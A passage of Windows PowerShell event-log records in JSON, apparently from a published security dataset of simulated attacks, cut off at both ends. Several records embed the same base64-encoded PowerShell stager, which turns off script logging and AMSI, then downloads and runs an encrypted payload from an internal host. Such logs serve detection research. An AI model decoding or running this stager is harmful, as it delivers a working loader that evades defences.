ANgA7ACQASAA9ACgAJABIACsAJABTAFsAJABJAF0AKQAlADIANQA2ADsAJABTAFsAJABJAF0ALAAkAFMAWwAkAEgAXQA9ACQAUwBbACQASABdACwAJABTAFsAJABJAF0AOwAkAF8ALQBiAFgATwBSACQAUwBbACgAJABTAFsAJABJAF0AKwAkAFMAWwAkAEgAXQApACUAMgA1ADYAXQB9AH0AOwAkADAAOQA3AEMALgBIAEUAQQBkAGUAUgBzAC4AQQBEAEQAKAAiAEMAbwBvAGsAaQBlACIALAAiAG0AZABKAGYASAByAFUAPQBHAGgAagBOAGQAUABCADIATABEAE0ALwBpAG8ATgBXAFQAOABWAEkAVwBXAFcAaABOAGwAQQA9ACIAKQA7ACQARABBAHQAYQA9ACQAMAA5ADcAQwAuAEQATwBXAG4ATABPAEEARABEAGEAVABBACgAJABzAEUAUgArACQAdAApADsAJABpAHYAPQAkAGQAQQB0AEEAWwAwAC4ALgAzAF0AOwAkAGQAQQBUAEEAPQAkAGQAQQBUAGEAWwA0AC4ALgAkAGQAQQBUAEEALgBsAGUATgBHAHQASABdADsALQBKAG8AaQBuAFsAQwBoAGEAcgBbAF0AXQAoACYAIAAkAFIAIAAkAEQAYQB0AEEAIAAoACQASQBWACsAJABLACkAKQB8AEkARQBYAA==\r\n\tEngineVersion=\r\n\tRunspaceId=\r\n\tPipelineId=\r\n\tCommandName=\r\n\tCommandType=\r\n\tScriptName=\r\n\tCommandPath=\r\n\tCommandLine=","@timestamp":"2020-09-22T08:22:43.273Z","SourceModuleType":"im_msvistalog","port":64545,"RecordNumber":240720,"Task":6,"@version":"1","SourceModuleName":"eventlog","Severity":"INFO","SourceName":"PowerShell","Category":"Provider Lifecycle","tags":["mordorDataset"],"Hostname":"WORKSTATION5.theshire.local"}
{"Keywords":36028797018963968,"SeverityValue":2,"EventReceivedTime":"2020-09-22 04:22:43","EventID":600,"ExecutionProcessID":0,"Channel":"Windows PowerShell","host":"wec.internal.cloudapp.net","ThreadID":0,"EventType":"INFO","Opcode":"Info","EventTime":"2020-09-22 04:22:42","Message":"Provider \"Variable\" is Started. \r\n\r\nDetails: \r\n\tProviderName=Variable\r\n\tNewProviderState=Started\r\n\r\n\tSequenceNumber=28377\r\n\r\n\tHostName=Default Host\r\n\tHostVersion=5.1.18362.752\r\n\tHostId=da6e33cf-5ea5-45e8-b75b-b0fc1487af33\r\n\tHostApplication=C:\\windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -noP -sta -w 1 -enc SQBGACgAJABQAFMAVgBlAFIAcwBJAE8AbgBUAEEAYgBsAGUALgBQAFMAVgBlAFIAcwBpAG8AbgAuAE0AQQBqAE8AUgAgAC0ARwBlACAAMwApAHsAJABBAEMARQA2AD0AWwByAEUAZgBdAC4AQQBzAHMARQBNAGIATABZAC4ARwBlAFQAVAB5AFAARQAoACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAFUAdABpAGwAcwAnACkALgAiAEcARQBUAEYASQBFAGAAbABkACIAKAAnAGMAYQBjAGgAZQBkAEcAcgBvAHUAcABQAG8AbABpAGMAeQBTAGUAdAB0AGkAbgBnAHMAJwAsACcATgAnACsAJwBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkAOwBJAGYAKAAkAEEAYwBlADYAKQB7ACQANABjADAARAA9ACQAQQBjAGUANgAuAEcARQB0AFYAYQBMAFUAZQAoACQATgBVAEwAbAApADsASQBmACgAJAA0AGMAMABEAFsAJwBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0AKQB7ACQANABjADAAZABbACcAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdAFsAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0APQAwADsAJAA0AEMAMABEAFsAJwBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0AWwAnAEUAbgBhAGIAbABlAFMAYwByAGkAcAB0AEIAbABvAGMAawBJAG4AdgBvAGMAYQB0AGkAbwBuAEwAbwBnAGcAaQBuAGcAJwBdAD0AMAB9ACQAdgBhAGwAPQBbAEMAbwBMAEwAZQBDAHQAaQBPAE4AcwAuAEcAZQBuAEUAUgBpAEMALgBEAEkAQwB0AEkAbwBOAEEAUgB5AFsAUwB0AFIAaQBOAGcALABTAFkAUwBUAEUAbQAuAE8AYgBqAGUAQwBUAF0AXQA6ADoATgBlAHcAKAApADsAJABWAEEAbAAuAEEAZABkACgAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnACwAMAApADsAJABWAGEATAAuAEEARABkACgAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCAGwAbwBjAGsASQBuAHYAbwBjAGEAdABpAG8AbgBMAG8AZwBnAGkAbgBnACcALAAwACkAOwAkADQAQwAwAGQAWwAnAEgASwBFAFkAXwBMAE8AQwBBAEwAXwBNAEEAQwBIAEkATgBFAFwAUwBvAGYAdAB3AGEAcgBlAFwAUABvAGwAaQBjAGkAZQBzAFwATQBpAGMAcgBvAHMAbwBmAHQAXABXAGkAbgBkAG8AdwBzAFwAUABvAHcAZQByAFMAaABlAGwAbABcAFMAYwByAGkAcAB0AEIAJwArACcAbABvAGMAawBMAG8AZwBnAGkAbgBnACcAXQA9ACQAdgBhAEwAfQBFAGwAUwBFAHsAWwBTAGMAcgBJAFAAVABCAEwAbwBDAEsAXQAuACIARwBFAFQARgBpAEUAYABMAEQAIgAoACcAcwBpAGcAbgBhAHQAdQByAGUAcwAnACwAJwBOACcAKwAnAG8AbgBQAHUAYgBsAGkAYwAsAFMAdABhAHQAaQBjACcAKQAuAFMARQB0AFYAYQBsAFUAZQAoACQAbgBVAGwATAAsACgATgBlAFcALQBPAGIAagBFAEMAVAAgAEMATwBsAEwAZQBDAHQASQBPAG4AUwAuAEcARQBOAEUAcgBpAGMALgBIAGEAUwBoAFMAZQBUAFsAcwBUAFIASQBOAGcAXQApACkAfQAkAFIAZQBmAD0AWwBSAEUARgBdAC4AQQBzAHMARQBNAGIATAB5AC4ARwBlAFQAVAB5AHAARQAoACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAbQBzAGkAJwArACcAVQB0AGkAbABzACcAKQA7ACQAUgBFAGYALgBHAEUAVABGAGkARQBMAGQAKAAnAGEAbQBzAGkASQBuAGkAdABGACcAKwAnAGEAaQBsAGUAZAAnACwAJwBOAG8AbgBQAHUAYgBsAGkAYwAsAFMAdABhAHQAaQBjACcAKQAuAFMAZQBUAFYAQQBMAHUAZQAoACQAbgBVAEwATAAsACQAdABSAFUARQApADsAfQA7AFsAUwBZAFMAVABFAE0ALgBOAEUAVAAuAFMARQBSAFYASQBDAEUAUABvAEkAbgB0AE0AQQBOAEEARwBFAHIAXQA6ADoARQB4AHAAZQBjAFQAMQAwADAAQwBvAG4AdABpAG4AdQBlAD0AMAA7ACQAMAA5ADcAQwA9AE4AZQBXAC0ATwBiAGoAZQBDAFQAIABTAHkAcwB0AGUATQAuAE4ARQBUAC4AVwBlAGIAQwBsAEkARQBOAHQAOwAkAHUAPQAnAE0AbwB6AGkAbABsAGEALwA1AC4AMAAgACgAVwBpAG4AZABvAHcAcwAgAE4AVAAgADYALgAxADsAIABXAE8AVwA2ADQAOwAgAFQAcgBpAGQAZQBuAHQALwA3AC4AMAA7ACAAcgB2ADoAMQAxAC4AMAApACAAbABpAGsAZQAgAEcAZQBjAGsAbwAnADsAJABzAGUAcgA9ACQAKABbAFQAZQB4AHQALgBFAE4AQwBvAEQASQBOAEcAXQA6ADoAVQBOAGkAYwBPAGQAZQAuAEcAZQBUAFMAVAByAGkAbgBHACgAWwBDAG8ATgBWAEUAUgBUAF0AOgA6AEYAUgBPAG0AQgBhAHMAZQA2ADQAUwBUAFIAaQBOAGcAKAAnAGEAQQBCADAAQQBIAFEAQQBjAEEAQQA2AEEAQwA4AEEATAB3AEEAeABBAEQAQQBBAEwAZwBBAHgAQQBEAEEAQQBMAGcAQQB4AEEARABBAEEATABnAEEAMQBBAEEAPQA9ACcAKQApACkAOwAkAHQAPQAnAC8AbgBlAHcAcwAuAHAAaABwACcAOwAkADAAOQA3AEMALgBIAGUAQQBEAGUAUgBzAC4AQQBEAEQAKAAnAFUAcwBlAHIALQBBAGcAZQBuAHQAJwAsACQAdQApADsAJAAwADkANwBjAC4AUABSAG8AeABZAD0AWwBTAHkAUwB0AGUAbQAuAE4AZQBUAC4AVwBlAGIAUgBFAHEAdQBFAHMAdABdADoAOgBEAGUARgBhAFUATABUAFcAZQBiAFAAUgBvAFgAeQA7ACQAMAA5ADcAYwAuAFAAcgBvAFgAWQAuAEMAUgBFAGQAZQBuAFQAaQBhAEwAUwAgAD0AIABbAFMAWQBzAHQARQBtAC4ATgBFAFQALgBDAHIAZQBEAEUAbgB0AEkAQQBsAEMAQQBDAGgARQBdADoAOgBEAEUARgBhAFUATAB0AE4ARQB0AHcAbwByAGsAQwByAGUAZABlAE4AVABpAGEATABTADsAJABTAGMAcgBpAHAAdAA6AFAAcgBvAHgAeQAgAD0AIAAkADAAOQA3AGMALgBQAHIAbwB4AHkAOwAkAEsAPQBbAFMAWQBzAFQAZQBtAC4AVABFAFgAVAAuAEUATgBjAE8AZABpAE4ARwBdADoAOgBBAFMAQwBJAEkALgBHAEUAVABCAHkAVABFAFMAKAAnADQARwBMAHkAXwA2ADwAKgBpAGYAcgA+AE0AVwB9AEkAKQBVAHAAdgB4AEAASwB1AFMAfgAzAGwAZABZADgAawAnACkAOwAkAFIAPQB7ACQARAAsACQASwA9ACQAQQByAGcAcwA7ACQAUwA9ADAALgAuADIANQA1ADsAMAAuAC4AMgA1ADUAfAAlAHsAJABKAD0AKAAkAEoAKwAkAFMAWwAkAF8AXQArACQASwBbACQAXwAlACQASwAuAEMAbwB1AE4AdABdACkAJQAyADUANgA7ACQAUwBbACQAXwBdACwAJABTAFsAJABKAF0APQAkAFMAWwAkAEoAXQAsACQAUwBbACQAXwBdAH0AOwAkAEQAfAAlAHsAJABJAD0AKAAkAEkAKwAxACkAJQAyADUANgA7ACQASAA9ACgAJABIACsAJABTAFsAJABJAF0AKQAlADIANQA2ADsAJABTAFsAJABJAF0ALAAkAFMAWwAkAEgAXQA9ACQAUwBbACQASABdACwAJABTAFsAJABJAF0AOwAkAF8ALQBiAFgATwBSACQAUwBbACgAJABTAFsAJABJAF0AKwAkAFMAWwAkAEgAXQApACUAMgA1ADYAXQB9AH0AOwAkADAAOQA3AEMALgBIAEUAQQBkAGUAUgBzAC4AQQBEAEQAKAAiAEMAbwBvAGsAaQBlACIALAAiAG0AZABKAGYASAByAFUAPQBHAGgAagBOAGQAUABCADIATABEAE0ALwBpAG8ATgBXAFQAOABWAEkAVwBXAFcAaABOAGwAQQA9ACIAKQA7ACQARABBAHQAYQA9ACQAMAA5ADcAQwAuAEQATwBXAG4ATABPAEEARABEAGEAVABBACgAJABzAEUAUgArACQAdAApADsAJABpAHYAPQAkAGQAQQB0AEEAWwAwAC4ALgAzAF0AOwAkAGQAQQBUAEEAPQAkAGQAQQBUAGEAWwA0AC4ALgAkAGQAQQBUAEEALgBsAGUATgBHAHQASABdADsALQBKAG8AaQBuAFsAQwBoAGEAcgBbAF0AXQAoACYAIAAkAFIAIAAkAEQAYQB0AEEAIAAoACQASQBWACsAJABLACkAKQB8AEkARQBYAA==\r\n\tEngineVersion=\r\n\tRunspaceId=\r\n\tPipelineId=\r\n\tCommandName=\r\n\tCommandType=\r\n\tScriptName=\r\n\tCommandPath=\r\n\tCommandLine=","@timestamp":"2020-09-22T08:22:43.274Z","SourceModuleType":"im_msvistalog","port":64545,"RecordNumber":240721,"Task":6,"@version":"1","SourceModuleName":"eventlog","Severity":"INFO","SourceName":"PowerShell","Category":"Provider Lifecycle","tags":["mordorDataset"],"Hostname":"WORKSTATION5.theshire.local"}
{"Keywords":36028797018963968,"SeverityValue":2,"EventReceivedTime":"2020-09-22 04:22:43","EventID":600,"ExecutionProcessID":0,"Channel":"Windows PowerShell","host":"wec.internal.cloudapp.net","ThreadID":0,"EventType":"INFO","Opcode":"Info","EventTime":"2020-09-22 04:22:42","Message":"Provider \"Certificate\" is Started. \r\n\r\nDetails: \r\n\tProviderName=Certificate\r\n\tNewProviderState=Started\r\n\r\n\tSequenceNumber=28379\r\n\r\n\tHostName=Default Host\r\n\tHostVersion=5.1.18362.752\r\n\tHostId=da6e33cf-5ea5-45e8-b75b-b0fc1487af33\r\n\tHostApplication=C:\\windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -noP -sta -w 1 -enc SQBGACgAJABQAFMAVgBlAFIAcwBJAE8AbgBUAEEAYgBsAGUALgBQAFMAVgBlAFIAcwBpAG8AbgAuAE0AQQBqAE8AUgAgAC0ARwBlACAAMwApAHsAJABBAEMARQA2AD0AWwByAEUAZgBdAC4AQQBzAHMARQBNAGIATABZAC4ARwBlAFQAVAB5AFAARQAoACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAFUAdABpAGwAcwAnACkALgAiAEcARQBUAEYASQBFAGAAbABkACIAKAAnAGMAYQBjAGgAZQBkAEcAcgBvAHUAcABQAG8AbABpAGMAeQBTAGUAdAB0AGkAbgBnAHMAJwAsACcATgAnACsAJwBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkAOwBJAGYAKAAkAEEAYwBlADYAKQB7ACQANABjADAARAA9ACQAQQBjAGUANgAuAEcARQB0AFYAYQBMAFUAZQAoACQATgBVAEwAbAApADsASQBmACgAJAA0AGMAMABEAFsAJwBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0AKQB7ACQANABjADAAZABbACcAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdAFsAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0APQAwADsAJAA0AEMAMABEAFsAJwBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0AWwAnAEUAbgBhAGIAbABlAFMAYwByAGkAcAB0AEIAbABvAGMAawBJAG4AdgBvAGMAYQB0AGkAbwBuAEwAbwBnAGcAaQBuAGcAJwBdAD0AMAB9ACQAdgBhAGwAPQBbAEMAbwBMAEwAZQBDAHQAaQBPAE4AcwAuAEcAZQBuAEUAUgBpAEMALgBEAEkAQwB0AEkAbwBOAEEAUgB5AFsAUwB0AFIAaQBOAGcALABTAFkAUwBUAEUAbQAuAE8AYgBqAGUAQwBUAF0AXQA6ADoATgBlAHcAKAApADsAJABWAEEAbAAuAEEAZABkACgAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnACwAMAApADsAJABWAGEATAAuAEEARABkACgAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCAGwAbwBjAGsASQBuAHYAbwBjAGEAdABpAG8AbgBMAG8AZwBnAGkAbgBnACcALAAwACkAOwAkADQAQwAwAGQAWwAnAEgASwBFAFkAXwBMAE8AQwBBAEwAXwBNAEEAQwBIAEkATgBFAFwAUwBvAGYAdAB3AGEAcgBlAFwAUABvAGwAaQBjAGkAZQBzAFwATQBpAGMAcgBvAHMAbwBmAHQAXABXAGkAbgBkAG8AdwBzAFwAUABvAHcAZQByAFMAaABlAGwAbABcAFMAYwByAGkAcAB0AEIAJwArACcAbABvAGMAawBMAG8AZwBnAGkAbgBnACcAXQA9ACQAdgBhAEwAfQBFAGwAUwBFAHsAWwBTAGMAcgBJAFAAVABCAEwAbwBDAEsAXQAuACIARwBFAFQARgBpAEUAYABMAEQAIgAoACcAcwBpAGcAbgBhAHQAdQByAGUAcwAnACwAJwBOACcAKwAnAG8AbgBQAHUAYgBsAGkAYwAsAFMAdABhAHQAaQBjACcAKQAuAFMARQB0AFYAYQBsAFUAZQAoACQAbgBVAGwATAAsACgATgBlAFcALQBPAGIAagBFAEMAVAAgAEMATwBsAEwAZQBDAHQASQBPAG4AUwAuAEcARQBOAEUAcgBpAGMALgBIAGEAUwBoAFMAZQBUAFsAcwBUAFIASQBOAGcAXQApACkAfQAkAFIAZQBmAD0AWwBSAEUARgBdAC4AQQBzAHMARQBNAGIATAB5AC4ARwBlAFQAVAB5AHAARQAoACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAbQBzAGkAJwArACcAVQB0AGkAbABzACcAKQA7ACQAUgBFAGYALgBHAEUAVABGAGkARQBMAGQAKAAnAGEAbQBzAGkASQBuAGkAdABGACcAKwAnAGEAaQBsAGUAZAAnACwAJwBOAG8AbgBQAHUAYgBsAGkAYwAsAFMAdABhAHQAaQBjACcAKQAuAFMAZQBUAFYAQQBMAHUAZQAoACQAbgBVAEwATAAsACQAdABSAFUARQApADsAfQA7AFsAUwBZAFMAVABFAE0ALgBOAEUAVAAuAFMARQBSAFYASQBDAEUAUABvAEkAbgB0AE0AQQBOAEEARwBFAHIAXQA6ADoARQB4AHAAZQBjAFQAMQAwADAAQwBvAG4AdABpAG4AdQBlAD0AMAA7ACQAMAA5ADcAQwA9AE4AZQBXAC0ATwBiAGoAZQBDAFQAIABTAHkAcwB0AGUATQAuAE4ARQBUAC4AVwBlAGIAQwBsAEkARQBOAHQAOwAkAHUAPQAnAE0AbwB6AGkAbABsAGEALwA1AC4AMAAgACgAVwBpAG4AZABvAHcAcwAgAE4AVAAgADYALgAxADsAIABXAE8AVwA2ADQAOwAgAFQAcgBpAGQAZQBuAHQALwA3AC4AMAA7ACAAcgB2ADoAMQAxAC4AMAApACAAbABpAGsAZQAgAEcAZQBjAGsAbwAnADsAJABzAGUAcgA9ACQAKABbAFQAZQB4AHQALgBFAE4AQwBvAEQASQBOAEcAXQA6ADoAVQBOAGkAYwBPAGQAZQAuAEcAZQBUAFMAVAByAGkAbgBHACgAWwBDAG8ATgBWAEUAUgBUAF0AOgA6AEYAUgBPAG0AQgBhAHMAZQA2ADQAUwBUAFIAaQBOAGcAKAAnAGEAQQBCADAAQQBIAFEAQQBjAEEAQQA2AEEAQwA4AEEATAB3AEEAeABBAEQAQQBBAEwAZwBBAHgAQQBEAEEAQQBMAGcAQQB4AEEARABBAEEATABnAEEAMQBBAEEAPQA9ACcAKQApACkAOwAkAHQAPQAnAC8AbgBlAHcAcwAuAHAAaABwACcAOwAkADAAOQA3AEMALgBIAGUAQQBEAGUAUgBzAC4AQQBEAEQAKAAnAFUAcwBlAHIALQBBAGcAZQBuAHQAJwAsACQAdQApADsAJAAwADkANwBjAC4AUABSAG8AeABZAD0AWwBTAHkAUwB0AGUAbQAuAE4AZQBUAC4AVwBlAGIAUgBFAHEAdQBFAHMAdABdADoAOgBEAGUARgBhAFUATABUAFcAZQBiAFAAUgBvAFgAeQA7ACQAMAA5ADcAYwAuAFAAcgBvAFgAWQAuAEMAUgBFAGQAZQBuAFQAaQBhAEwAUwAgAD0AIABbAFMAWQBzAHQARQBtAC4ATgBFAFQALgBDAHIAZQBEAEUAbgB0AEkAQQBsAEMAQQBDAGgARQBdADoAOgBEAEUARgBhAFUATAB0AE4ARQB0AHcAbwByAGsAQwByAGUAZABlAE4AVABpAGEATABTADsAJABTAGMAcgBpAHAAdAA6AFAAcgBvAHgAeQAgAD0AIAAkADAAOQA3AGMALgBQAHIAbwB4AHkAOwAkAEsAPQBbAFMAWQBzAFQAZQBtAC4AVABFAFgAVAAuAEUATgBjAE8AZABpAE4ARwBdADoAOgBBAFMAQwBJAEkALgBHAEUAVABCAHkAVABFAFMAKAAnADQARwBMAHkAXwA2ADwAKgBpAGYAcgA+AE0AVwB9AEkAKQBVAHAAdgB4AEAASwB1AFMAfgAzAGwAZABZADgAawAnACkAOwAkAFIAPQB7ACQARAAsACQASwA9ACQAQQByAGcAcwA7ACQAUwA9ADAALgAuADIANQA1ADsAMAAuAC4AMgA1ADUAfAAlAHsAJABKAD0AKAAkAEoAKwAkAFMAWwAkAF8AXQArACQASwBbACQAXwAlACQASwAuAEMAbwB1AE4AdABdACkAJQAyADUANgA7ACQAUwBbACQAXwBdACwAJABTAFsAJABKAF0APQAkAFMAWwAkAEoAXQAsACQAUwBbACQAXwBdAH0AOwAkAEQAfAAlAHsAJABJAD0AKAAkAEkAKwAxACkAJQAyADUANgA7ACQASAA9ACgAJABIACsAJABTAFsAJABJAF0AKQAlADIANQA2ADsAJABTAFsAJABJAF0ALAAkAFMAWwAkAEgAXQA9ACQAUwBbACQASABdACwAJABTAFsAJABJAF0AOwAkAF8ALQBiAFgATwBSACQAUwBbACgAJABTAFsAJABJAF0AKwAkAFMAWwAkAEgAXQApACUAMgA1ADYAXQB9AH0AOwAkADAAOQA3AEMALgBIAEUAQQBkAGUAUgBzAC4AQQBEAEQAKAAiAEMAbwBvAGsAaQBlACIALAAiAG0AZABKAGYASAByAFUAPQBHAGgAagBOAGQAUABCADIATABEAE0ALwBpAG8ATgBXAFQAOABWAEkAVwBXAFcAaABOAGwAQQA9ACIAKQA7ACQARABBAHQAYQA9ACQAMAA5ADcAQwAuAEQATwBXAG4ATABPAEEARABEAGEAVABBACgAJABzAEUAUgArACQAdAApADsAJABpAHYAPQAkAGQAQQB0AEEAWwAwAC4ALgAzAF0AOwAkAGQAQQBUAEEAPQAkAGQAQQBUAGEAWwA0AC4ALgAkAGQAQQBUAEEALgBsAGUATgBHAHQASABdADsALQBKAG8AaQBuAFsAQwBoAGEAcgBbAF0AXQAoACYAIAAkAFIAIAAkAEQAYQB0AEEAIAAoACQASQBWACsAJABLACkAKQB8AEkARQBYAA==\r\n\tEngineVersion=\r\n\tRunspaceId=\r\n\tPipelineId=\r\n\tCommandName=\r\n\tCommandType=\r\n\tScriptName=\r\n\tCommandPath=\r\n\tCommandLine=","@timestamp":"2020-09-22T08:22:43.275Z","SourceModuleType":"im_msvistalog","port":64545,"RecordNumber":240722,"Task":6,"@version":"1","SourceModuleName":"eventlog","Severity":"INFO","SourceName":"PowerShell","Category":"Provider Lifecycle","tags":["mordorDataset"],"Hostname":"WORKSTATION5.theshire.local"}
{"Keywords":36028797018963968,"SeverityValue":2,"EventReceivedTime":"2020-09-22 04:22:43","EventID":600,"ExecutionProcessID":0,"Channel":"Windows PowerShell","host":"wec.internal.cloudapp.net","ThreadID":0,"EventType":"INFO","Opcode":"Info","EventTime":"2020-09-22 04:22:42","Message":"Provider \"WSMan\" is Started. \r\n\r\nDetails: \r\n\tProviderName=WSMan\r\n\tNewProviderState=Started\r\n\r\n\tSequenceNumber=28381\r\n\r\n\tHostName=Default Host\r\n\tHostVersion=5.1.18362.752\r\n\tHostId=da6e33cf-5ea5-45e8-b75b-b0fc1487af33\r\n\tHostApplication=C:\\windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -noP -sta -w 1 -enc SQBGACgAJABQAFMAVgBlAFIAcwBJAE8AbgBUAEEAYgBsAGUALgBQAFMAVgBlAFIAcwBpAG8AbgAuAE0AQQBqAE8AUgAgAC0ARwBlACAAMwApAHsAJABBAEMARQA2AD0AWwByAEUAZgBdAC4AQQBzAHMARQBNAGIATABZAC4ARwBlAFQAVAB5AFAARQAoACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAFUAdABpAGwAcwAnACkALgAiAEcARQBUAEYASQBFAGAAbABkACIAKAAnAGMAYQBjAGgAZQBkAEcAcgBvAHUAcABQAG8AbABpAGMAeQBTAGUAdAB0AGkAbgBnAHMAJwAsACcATgAnACsAJwBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkAOwBJAGYAKAAkAEEAYwBlADYAKQB7ACQANABjADAARAA9ACQAQQBjAGUANgAuAEcARQB0AFYAYQBMAFUAZQAoACQATgBVAEwAbAApADsASQBmACgAJAA0AGMAMABEAFsAJwBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0AKQB7ACQANABjADAAZABbACcAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdAFsAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0APQAwADsAJAA0AEMAMABEAFsAJwBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0AWwAnAEUAbgBhAGIAbABlAFMAYwByAGkAcAB0AEIAbABvAGMAawBJAG4AdgBvAGMAYQB0AGkAbwBuAEwAbwBnAGcAaQBuAGcAJwBdAD0AMAB9ACQAdgBhAGwAPQBbAEMAbwBMAEwAZQBDAHQAaQBPAE4AcwAuAEcAZQBuAEUAUgBpAEMALgBEAEkAQwB0AEkAbwBOAEEAUgB5AFsAUwB0AFIAaQBOAGcALABTAFkAUwBUAEUAbQAuAE8AYgBqAGUAQwBUAF0AXQA6ADoATgBlAHcAKAApADsAJABWAEEAbAAuAEEAZABkACgAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnACwAMAApADsAJABWAGEATAAuAEEARABkACgAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCAGwAbwBjAGsASQBuAHYAbwBjAGEAdABpAG8AbgBMAG8AZwBnAGkAbgBnACcALAAwACkAOwAkADQAQwAwAGQAWwAnAEgASwBFAFkAXwBMAE8AQwBBAEwAXwBNAEEAQwBIAEkATgBFAFwAUwBvAGYAdAB3AGEAcgBlAFwAUABvAGwAaQBjAGkAZQBzAFwATQBpAGMAcgBvAHMAbwBmAHQAXABXAGkAbgBkAG8AdwBzAFwAUABvAHcAZQByAFMAaABlAGwAbABcAFMAYwByAGkAcAB0AEIAJwArACcAbABvAGMAawBMAG8AZwBnAGkAbgBnACcAXQA9ACQAdgBhAEwAfQBFAGwAUwBFAHsAWwBTAGMAcgBJAFAAVABCAEwAbwBDAEsAXQAuACIARwBFAFQARgBpAEUAYABMAEQAIgAoACcAcwBpAGcAbgBhAHQAdQByAGUAcwAnACwAJwBOACcAKwAnAG8AbgBQAHUAYgBsAGkAYwAsAFMAdABhAHQAaQBjACcAKQAuAFMARQB0AFYAYQBsAFUAZQAoACQAbgBVAGwATAAsACgATgBlAFcALQBPAGIAagBFAEMAVAAgAEMATwBsAEwAZQBDAHQASQBPAG4AUwAuAEcARQBOAEUAcgBpAGMALgBIAGEAUwBoAFMAZQBUAFsAcwBUAFIASQBOAGcAXQApACkAfQAkAFIAZQBmAD0AWwBSAEUARgBdAC4AQQBzAHMARQBNAGIATAB5AC4ARwBlAFQAVAB5AHAARQAoACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAbQBzAGkAJwArACcAVQB0AGkAbABzACcAKQA7ACQAUgBFAGYALgBHAEUAVABGAGkARQBMAGQAKAAnAGEAbQBzAGkASQBuAGkAdABGACcAKwAnAGEAaQBsAGUAZAAnACwAJwBOAG8AbgBQAHUAYgBsAGkAYwAsAFMAdABhAHQAaQBjACcAKQAuAFMAZQBUAFYAQQBMAHUAZQAoACQAbgBVAEwATAAsACQAdABSAFUARQApADsAfQA7AFsAUwBZAFMAVABFAE0ALgBOAEUAVAAuAFMARQBSAFYASQBDAEUAUABvAEkAbgB0AE0AQQBOAEEARwBFAHIAXQA6ADoARQB4AHAAZQBjAFQAMQAwADAAQwBvAG4AdABpAG4AdQBlAD0AMAA7ACQAMAA5ADcAQwA9AE4AZQBXAC0ATwBiAGoAZQBDAFQAIABTAHkAcwB0AGUATQAuAE4ARQBUAC4AVwBlAGIAQwBsAEkARQBOAHQAOwAkAHUAPQAnAE0AbwB6AGkAbABsAGEALwA1AC4AMAAgACgAVwBpAG4AZABvAHcAcwAgAE4AVAAgADYALgAxADsAIABXAE8AVwA2ADQAOwAgAFQAcgBpAGQAZQBuAHQALwA3AC4AMAA7ACAAcgB2ADoAMQAxAC4AMAApACAAbABpAGsAZQAgAEcAZQBjAGsAbwAnADsAJABzAGUAcgA9ACQAKABbAFQAZQB4AHQALgBFAE4AQwBvAEQASQBOAEcAXQA6ADoAVQBOAGkAYwBPAGQAZQAuAEcAZQBUAFMAVAByAGkAbgBHACgAWwBDAG8ATgBWAEUAUgBUAF0AOgA6AEYAUgBPAG0AQgBhAHMAZQA2ADQAUwBUAFIAaQBOAGcAKAAnAGEAQQBCADAAQQBIAFEAQQBjAEEAQQA2AEEAQwA4AEEATAB3AEEAeABBAEQAQQBBAEwAZwBBAHgAQQBEAEEAQQBMAGcAQQB4AEEARABBAEEATABnAEEAMQBBAEEAPQA9ACcAKQApACkAOwAkAHQAPQAnAC8AbgBlAHcAcwAuAHAAaABwACcAOwAkADAAOQA3AEMALgBIAGUAQQBEAGUAUgBzAC4AQQBEAEQAKAAnAFUAcwBlAHIALQBBAGcAZ